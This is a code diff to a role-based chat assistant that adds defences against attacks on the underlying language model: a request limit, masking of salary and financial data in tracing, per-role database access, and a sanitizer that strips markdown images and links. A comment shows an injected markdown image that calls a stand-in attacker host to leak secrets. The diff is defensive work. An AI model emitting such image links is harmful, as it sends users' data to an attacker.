@@ -1,15 +1,70 @@
+import json
+import re
 from dataclasses import dataclass, field
 
 from langfuse import get_client, observe, propagate_attributes
+from langfuse.types import MaskOtelSpansParams, MaskOtelSpansResult, OtelSpanPatch
+from pydantic_ai import UsageLimitExceeded, UsageLimits
 from pydantic_ai.messages import ModelMessage, ToolCallPart
 from sqlalchemy import Engine
 
 from rolchat.agent import agent
 from rolchat.guard import check_input
+from rolchat.models import ROLE_LEVELS
 from rolchat.policy import allowed_tools
 from rolchat.tools import Deps
 
 REFUSAL = "Bu konuda bilgim yok."
+# Unbounded consumption (OWASP LLM10): a runaway tool loop stops after a few model requests.
+USAGE_LIMITS = UsageLimits(request_limit=5)
+
+# Improper output handling (OWASP LLM05): a markdown image is loaded by the browser on its own, so an
+# injected ![x](https://attacker/?d=SECRET) would leak data. Drop images, keep only the text of links.
+_DEST = r"\((?:[^()]|\([^()]*\))*\)"  # (url), allowing one level of nested parentheses
+_IMAGE = re.compile(r"!\[[\s\S]*?\](?:" + _DEST + r"|\[[^\]]*\])")
+_LINK = re.compile(r"\[([^\]]*)\]" + _DEST)
+_REF_DEF = re.compile(r"^ {0,3}\[[^\]]+\]:.*$", re.MULTILINE)
+
+
+def sanitize(text: str) -> str:
+    return _REF_DEF.sub("", _LINK.sub(r"\1", _IMAGE.sub("", text)))
+
+
+# Sensitive information disclosure (OWASP LLM02): level-3 tool data (salaries, financials) stays out of
+# Langfuse. A span that carries a level-3 tool result, or the model's answer built from one, keeps its
+# structure but loses its content.
+LEVEL3_TOOLS = allowed_tools("patron") - allowed_tools("sekreter")
+MASKED = "[gizli: seviye 3]"
+_CONTENT = (
+    "gen_ai.tool.call.result",
+    "gen_ai.input.messages",
+    "gen_ai.output.messages",
+    "pydantic_ai.all_messages",
+    "final_result",
+    "langfuse.observation.output",
+)
+
+
+def _has_level3_data(attrs) -> bool:
+    if attrs.get("gen_ai.tool.name") in LEVEL3_TOOLS:
+        return True
+    if LEVEL3_TOOLS & set(json.loads(attrs.get("langfuse.observation.metadata.tools_called", "[]"))):
+        return True
+    return any(
+        part.get("type") == "tool_call_response" and part.get("name") in LEVEL3_TOOLS
+        for key in ("gen_ai.input.messages", "pydantic_ai.all_messages")
+        for msg in json.loads(attrs.get(key, "[]"))
+        for part in msg.get("parts", [])
+    )
+
+
+def mask_level3_spans(*, params: MaskOtelSpansParams) -> MaskOtelSpansResult:
+    # If this raises (bad JSON), Langfuse drops the whole batch: fails closed.
+    return MaskOtelSpansResult(span_patches={
+        ident: OtelSpanPatch(set_attributes={k: json.dumps(MASKED) for k in _CONTENT if k in span.attributes})
+        for ident, span in params.spans.items()
+        if _has_level3_data(span.attributes)
+    })
 
 
 @dataclass
@@ -26,13 +81,14 @@ async def answer(
     text: str,
     role: str,
     history: list[ModelMessage],
-    engine: Engine,
+    engines: dict[int, Engine],
     guard=check_input,
     session_id: str | None = None,
 ) -> Reply:
     # Everything under this trace (guardrail, LLM calls, tool calls) is tagged with the role.
     with propagate_attributes(user_id=role, session_id=session_id, tags=[f"rol:{role}"]):
-        reply = await _answer(text, role, history, engine, guard)
+        reply = await _answer(text, role, history, engines, guard)
+    reply.text = sanitize(reply.text)
     langfuse = get_client()
     langfuse.update_current_span(
         input=text,
@@ -43,12 +99,21 @@ async def answer(
     return reply
 
 
-async def _answer(text, role, history, engine, guard) -> Reply:
+async def _answer(text, role, history, engines, guard) -> Reply:
     blocked_by = await guard(text)
     if blocked_by:
         return Reply(text=REFUSAL, history=history, blocked_by=blocked_by)
 
-    result = await agent.run(text, deps=Deps(role=role, engine=engine), message_history=history)
+    try:
+        result = await agent.run(
+            text,
+            # Third layer: the database user of the role's level cannot read higher-level tables.
+            deps=Deps(role=role, engine=engines[ROLE_LEVELS[role]]),
+            message_history=history,
+            usage_limits=USAGE_LIMITS,
+        )
+    except UsageLimitExceeded:
+        return Reply(text=REFUSAL, history=history, tools_offered=sorted(allowed_tools(role)))
     called = [
         part.tool_name
         for msg in result.new_messages()
